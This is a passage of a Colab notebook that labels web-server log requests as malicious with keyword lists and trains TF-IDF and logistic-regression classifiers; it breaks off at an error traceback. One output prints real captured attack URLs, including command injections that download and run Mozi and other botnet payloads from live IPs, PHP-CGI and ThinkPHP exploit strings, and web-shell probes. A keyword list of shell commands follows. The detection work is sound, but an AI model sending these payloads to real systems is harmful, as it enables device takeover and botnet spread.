        "id": "ySxcXftAqbka",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "f5c646e0-e877-43ec-9c3f-62267ec18ee9"
      },
      "source": [
        "dft.request[1100:1300].values"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://60.243.48.141:35921/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1',\n",
              "       '/.env', '/admin//config.php', '/boaform/admin/formLogin',\n",
              "       '/shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws',\n",
              "       '/xmlrpc.php', '/blog/xmlrpc.php', '/wp-login.php',\n",
              "       '/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://185.172.111.196/awGawgf.sh%20-O%2012.awGawgf.sh;curl%20-O%20http://185.172.111.196/awGawgf.sh%20-O%2011.awGawgf.sh;%20chmod%20777%20*;%20sh%2011.awGawgf.sh;%20sh%2012.awGawgf.sh)&password=admin',\n",
              "       '/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://185.172.111.196/awGawgf.sh%20-O%2012.awGawgf.sh;curl%20-O%20http://185.172.111.196/awGawgf.sh%20-O%2011.awGawgf.sh;%20chmod%20777%20*;%20sh%2011.awGawgf.sh;%20sh%2012.awGawgf.sh)&password=admin',\n",
              "       '/admin//config.php', '/portal/redlion',\n",
              "       '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://116.74.135.9:35378/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1',\n",
              "       '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.99.237.101:37481/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1',\n",
              "       'http://5.188.210.227/echo.php', '/blog/', '/wp/', '/wordpress/',\n",
              "       '/new/', '/old/', '/test/', '/main/', '/site/', '/backup/',\n",
              "       '/demo/', '/home/', '/tmp/', '/cms/', '/dev/', '/old-wp/', '/web/',\n",
              "       '/old-site/', '/temp/', '/2018/', '/2019/', '/bk/', '/wp1/',\n",
              "       '/wp2/', '/v1/', '/v2/', '/bak/', '/install/', '/2020/',\n",
              "       '/new-site/',\n",
              "       '/shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws',\n",
              "       '/GponForm/diag_Form?images/', '/robots.txt',\n",
              "       '/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f',\n",
              "       '/shell?cd+/tmp;rm+-rf+*;wget+http://60.243.112.189:44585/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws',\n",
              "       '/boaform/admin/formLogin', '/index.php',\n",
              "       '/w00tw00t.at.ISC.SANS.DFind:)', '/w00tw00t.at.ISC.SANS.DFind:)',\n",
              "       '/solr/admin/info/system?wt=json',\n",
              "       '/?XDEBUG_SESSION_START=phpstorm',\n",
              "       '/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>',\n",
              "       '/api/jsonws/invoke',\n",
              "       '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',\n",
              "       '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',\n",
              "       '/.well-known/security.txt', '/robots.txt',\n",
              "       '/Admin8f84a4c1/Login.php', '/l.php', '/phpinfo.php', '/test.php',\n",
              "       '/index.php', '/bbs.php', '/forum.php', '/forums.php',\n",
              "       '/bbs/index.php', '/forum/index.php', '/forums/index.php',\n",
              "       '/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E',\n",
              "       '/%62%61%73%65/%70%6F%73%74%2E%70%68%70', '/webdav/',\n",
              "       '/%69%73%70%69%72%69%74/%69%6D/%75%70%6C%6F%61%64%2E%70%68%70',\n",
              "       '/help.php', '/java.php', '/_query.php', '/test.php',\n",
              "       '/db_cts.php', '/db_pma.php', '/logon.php', '/help-e.php',\n",
              "       '/license.php', '/log.php', '/hell.php', '/pmd_online.php',\n",
              "       '/x.php', '/shell.php', '/htdocs.php', '/b.php', '/sane.php',\n",
              "       '/desktop.ini.php', '/z.php', '/lala.php', '/lala-dpr.php',\n",
              "       '/wpc.php', '/wpo.php', '/t6nv.php', '/muhstik.php', '/text.php',\n",
              "       '/wp-config.php', '/muhstik.php', '/muhstik2.php', '/muhstiks.php',\n",
              "       '/muhstik-dpr.php', '/lol.php', '/uploader.php', '/cmd.php',\n",
              "       '/cmv.php', '/cmdd.php', '/knal.php', '/cmd.php', '/shell.php',\n",
              "       '/appserv.php', '/scripts/setup.php',\n",
              "       '/phpmyadmin/scripts/setup.php', '/phpMyAdmin/scripts/setup.php',\n",
              "       '/scripts/db___.init.php', '/phpmyadmin/scripts/db___.init.php',\n",
              "       '/phpMyAdmin/scripts/db___.init.php', '/pma/scripts/setup.php',\n",
              "       '/PMA/scripts/setup.php', '/myadmin/scripts/setup.php',\n",
              "       '/MyAdmin/scripts/setup.php', '/pma/scripts/db___.init.php',\n",
              "       '/PMA/scripts/db___.init.php', '/myadmin/scripts/db___.init.php',\n",
              "       '/MyAdmin/scripts/db___.init.php',\n",
              "       '/plugins/weathermap/editor.php',\n",
              "       '/cacti/plugins/weathermap/editor.php', '/weathermap/editor.php',\n",
              "       '/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50',\n",
              "       '/elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50',\n",
              "       '/App/?content=die(md5(HelloThinkPHP))',\n",
              "       '/index.php/module/action/param1/${@die(md5(HelloThinkPHP))}',\n",
              "       '/index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))}',\n",
              "       '/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>',\n",
              "       '/joomla/', '/Joomla/', '/?a=echo%20-n%20HelloNginx%7Cmd5sum',\n",
              "       '/d7.php', '/rxr.php', '/1x.php', '/home.php', '/undx.php',\n",
              "       '/spider.php', '/payload.php', '/composers.php', '/izom.php',\n",
              "       '/composer.php', '/hue2.php', '/Drupal.php', '/izom.php',\n",
              "       '/payload.php', '/new_license.php', '/images/!.php',\n",
              "       '/images/vuln.php', '/hd.php', '/images/up.php',\n",
              "       '/images/attari.php', '/images/jsspwneed.php',\n",
              "       '/images/stories/cmd.php',\n",
              "       '/images/stories/filemga.php?ssp=RfVbHu', '/up.php',\n",
              "       '/laravel.php', '/huoshan.php', '/yu.php', '/floaw.php',\n",
              "       '/ftmabc.php', '/doudou.php', '/mjx.php', '/xiaoxia.php',\n",
              "       '/yuyang.php', '/zz.php', '/coonig.php', '/ak.php',\n",
              "       '/baidoubi.php', '/hhhhhh.php', '/meijianxue.php', '/no1.php',\n",
              "       '/python.php', '/woshimengmei.php', '/indea.php', '/taisui.php',\n",
              "       '/xiaxia.php', '/kk.php', '/xsser.php', '/zzz.php', '/99.php',\n",
              "       '/dp.php', '/hs.php', '/1ts.php', '/haiyan.php', '/phpdm.php'],\n",
              "      dtype=object)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 28
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "gOeUpV_RvaZ_"
      },
      "source": [
        "Potential malitious requests:\n",
        "die, md5, phpunit, .env,"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "K9YU2SnQ-UYn"
      },
      "source": [
        "# 3 Data labeling"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "uIXQ4pxc-UYo"
      },
      "source": [
        "## 3.1 Functions used to filter malicious requests using keywords "
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xfgmrKT1-UYp"
      },
      "source": [
        "def find_bad(tmp_df, phrase):\n",
        "    'Find rows by keyword phrase using regex'\n",
        "    new_df = tmp_df[tmp_df.requests.str.contains(phrase, regex=True, na=False)]\n",
        "    return new_df"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h9znRKE7-UYs"
      },
      "source": [
        "def build_phrase(list):\n",
        "    tmp = ''\n",
        "    for word in list:\n",
        "        if tmp == '': tmp = f'{word}'\n",
        "        else: tmp = f'{tmp}|{word}'\n",
        "    return tmp"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "hChcFTtE-UYx"
      },
      "source": [
        "def get_bad_requests(tmp1_df, keywords):\n",
        "  bad_requests_phrase = build_phrase(keywords)\n",
        "  bad_requests_rows = tmp1_df[tmp1_df.request.str.contains(bad_requests_phrase, regex=True, na=False)]\n",
        "  return bad_requests_rows"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ooyyWJwK-UYw"
      },
      "source": [
        "### 3.1.1 all bad requests"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cx7j1GsDzial"
      },
      "source": [
        "bad_chars = [\n",
        "  '\\.', '\\@', '\\{', '\\}', '\\(', '\\)', '\\+', '\\_', '\\;',\n",
        "]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "L4qLzSaWzqI5"
      },
      "source": [
        "bad_words = [\n",
        "    'cgi', 'shell', 'die', 'md5', 'phpunit', 'env', 'sh', \n",
        "    'ls', 'cd', 'rm', 'rf', 'wget', 'cmod', 'chown',\n",
        "    'ZINFO', 'fig', 'script', 'php', 'w00t', 'https', 'com',\n",
        "    '\\%6e', '\\%6c', '\\%6d', '\\%61', '\\%63','\\%64', '\\%65', '\\%66', '\\%67', '\\%68', '\\%69',\n",
        "    '\\%7a', '\\%70', '\\%72', '\\%73', '\\%74', '\\%75', '\\%76', '\\%77', '\\%78', '\\%79',\n",
        "]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "sbnd7-02rjbL"
      },
      "source": [
        "### 3.1.2 Labeling. TODO nuo cia galima viska det i pipeline"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h4kazElHz_tr",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "0c23bb66-caf1-488a-83e6-e5562b8fc18f"
      },
      "source": [
        "bad_char_requests = get_bad_requests(dft, bad_chars)\r\n",
        "bad_char_requests.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(38091, 9)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 27
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "08n7XZxz0IFR",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "03d85c69-128a-4771-d140-788874f738b7"
      },
      "source": [
        "bad_word_requests = get_bad_requests(dft, bad_words)\r\n",
        "bad_word_requests.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(16438, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 38
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "yhgw0SoK-UZl"
      },
      "source": [
        "## 3.2 Good requests"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "UpsG-f_E-UZm"
      },
      "source": [
        "# good_char_requests = bad_char_requests.merge(dft, how='outer', indicator=True).loc[lambda x : x['_merge']=='right_only']\n",
        "good_word_requests = bad_word_requests.merge(dft, how='outer', indicator=True).loc[lambda x : x['_merge']=='right_only']"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "98wC5iqZ-UZp",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "736127ad-e7c6-4659-b79a-a95f72c0dd23"
      },
      "source": [
        "# good_char_requests.shape\r\n",
        "good_word_requests.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(32461, 11)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 40
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "sWSVdA3x-UZx"
      },
      "source": [
        "# 4 Split and vectorize data"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "qP2uugg18WWT"
      },
      "source": [
        "## 4.1 Split data"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "OBJDvlaMG3IY"
      },
      "source": [
        "dft['is_safe'] = dft.request.isin(good_word_requests.request).astype(bool)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "KUcYB6qN0a7p",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 379
        },
        "outputId": "a0972b57-42d8-42ad-84c8-84b65ce6f6f3"
      },
      "source": [
        "dft[450:455]"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>IP</th>\n",
              "      <th>date</th>\n",
              "      <th>full_request</th>\n",
              "      <th>code</th>\n",
              "      <th>bytes</th>\n",
              "      <th>agent</th>\n",
              "      <th>method</th>\n",
              "      <th>request</th>\n",
              "      <th>http_v</th>\n",
              "      <th>is_safe</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>987</th>\n",
              "      <td>206.189.47.136</td>\n",
              "      <td>19/Sep/2020:07:59:24</td>\n",
              "      <td>GET /.env HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>python-requests/2.24.0</td>\n",
              "      <td>GET</td>\n",
              "      <td>/.env</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>989</th>\n",
              "      <td>45.14.44.2</td>\n",
              "      <td>19/Sep/2020:08:04:03</td>\n",
              "      <td>HEAD /robots.txt HTTP/1.0</td>\n",
              "      <td>404</td>\n",
              "      <td>0</td>\n",
              "      <td>-</td>\n",
              "      <td>HEAD</td>\n",
              "      <td>/robots.txt</td>\n",
              "      <td>HTTP/1.0</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>991</th>\n",
              "      <td>192.241.233.55</td>\n",
              "      <td>19/Sep/2020:08:13:17</td>\n",
              "      <td>GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 zgrab/0.x</td>\n",
              "      <td>GET</td>\n",
              "      <td>/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1025</th>\n",
              "      <td>122.51.187.225</td>\n",
              "      <td>19/Sep/2020:09:31:16</td>\n",
              "      <td>GET /TP/public/index.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/TP/public/index.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1026</th>\n",
              "      <td>122.51.187.225</td>\n",
              "      <td>19/Sep/2020:09:31:16</td>\n",
              "      <td>GET /TP/index.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/TP/index.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                  IP                  date  ...    http_v  is_safe\n",
              "987   206.189.47.136  19/Sep/2020:07:59:24  ...  HTTP/1.1    False\n",
              "989       45.14.44.2  19/Sep/2020:08:04:03  ...  HTTP/1.0     True\n",
              "991   192.241.233.55  19/Sep/2020:08:13:17  ...  HTTP/1.1    False\n",
              "1025  122.51.187.225  19/Sep/2020:09:31:16  ...  HTTP/1.1    False\n",
              "1026  122.51.187.225  19/Sep/2020:09:31:16  ...  HTTP/1.1    False\n",
              "\n",
              "[5 rows x 10 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 43
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "hITwjdoj21W8"
      },
      "source": [
        "queries = dft['request'].to_list()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "g2ui7jGb6VeP"
      },
      "source": [
        "y = dft['is_safe'].to_list()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "uF8u6TW1GQPa",
        "outputId": "f3fe6c33-4e04-4898-843a-44ae33ab1c04"
      },
      "source": [
        "len(y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "48899"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 47
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "C7Z0CAouGcEL"
      },
      "source": [
        "# 50% split\r\n",
        "mid = int(len(y) / 2)\r\n",
        "trn_y = y[:mid]\r\n",
        "val_y = y[mid:]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cz38bCt1Fdj4",
        "outputId": "37cf6e4e-82bf-4695-9309-3d68b82fc10a"
      },
      "source": [
        "len(trn_y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "24449"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 49
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "bfVinYsSt97n",
        "outputId": "6ee80017-1f32-463b-89a7-f2f9c58c2c75"
      },
      "source": [
        "trn = queries[:mid]\r\n",
        "val = queries[mid:]\r\n",
        "len(queries), len(trn), len(val)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(48899, 24449, 24450)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 50
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "PLgDV38KtD1M"
      },
      "source": [
        "## 4.2 TfidfVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "92_RIl6gsFfY"
      },
      "source": [
        "vectorizer = TfidfVectorizer(\n",
        "    min_df=0.0, \n",
        "    analyzer=\"word\", \n",
        "    sublinear_tf=True, \n",
        "    ngram_range=(1,3))\n",
        "X = vectorizer.fit_transform(queries)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h61KyJDt5kPq"
      },
      "source": [
        "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "XHwmuuWB6lb2"
      },
      "source": [
        "lgs = LogisticRegression(class_weight={1: 2 * len(good_requests) / len(bad_word_requests), 0: 1.0})"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ukpIxjUn6ylP",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "c6cd25a6-c251-4058-df25-3aa622cd1f92"
      },
      "source": [
        "%%time\n",
        "lgs.fit(X_train, y_train)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 1.48 s, sys: 1.88 s, total: 3.36 s\n",
            "Wall time: 1.74 s\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=1.0, class_weight={0: 1.0, 1: 3.949507239323519},\n",
              "                   dual=False, fit_intercept=True, intercept_scaling=1,\n",
              "                   l1_ratio=None, max_iter=100, multi_class='auto', n_jobs=None,\n",
              "                   penalty='l2', random_state=None, solver='lbfgs', tol=0.0001,\n",
              "                   verbose=0, warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 55
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nb4o5A7fs7BT"
      },
      "source": [
        "## 4.3 CountVectorizer - trigram NB features"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zSnZNVtVjn85"
      },
      "source": [
        "veczr = CountVectorizer(analyzer='word')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "m7aIl6khvQL4",
        "outputId": "878420ae-2371-4bfc-f708-6390da9e4afc"
      },
      "source": [
        "%%time\r\n",
        "trn_term_doc1 = veczr.fit_transform(trn)\r\n",
        "val_term_doc1 = veczr.transform(val)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 327 ms, sys: 0 ns, total: 327 ms\n",
            "Wall time: 328 ms\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "T7ifwoq9vWtm",
        "outputId": "89f5615a-b651-4a84-c879-bdae98cf6fd5"
      },
      "source": [
        "trn_term_doc1"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<24449x4165 sparse matrix of type '<class 'numpy.int64'>'\n",
              "\twith 144074 stored elements in Compressed Sparse Row format>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 58
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "i2tvmwZcvhz-"
      },
      "source": [
        "vocab = veczr.get_feature_names(); vocab[600:650]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ycfVt5ZsvtAC",
        "outputId": "d40bd680-db1e-4938-87c8-899c1a81c8f0"
      },
      "source": [
        "w0 = set([o.lower() for o in trn[0].split(' ')]); w0"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'/vendor/phpunit/phpunit/src/util/php/eval-stdin.php'}"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 61
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 323
        },
        "id": "xtg3El8N1xgy",
        "outputId": "20f16d59-361d-457f-84ab-89267003676b"
      },
      "source": [
        "m = LogisticRegression(C=1e8)\r\n",
        "m.fit(trn_term_doc1, y_train)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "ValueError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mValueError\u001b[0m                                Traceback (most recent call last)",
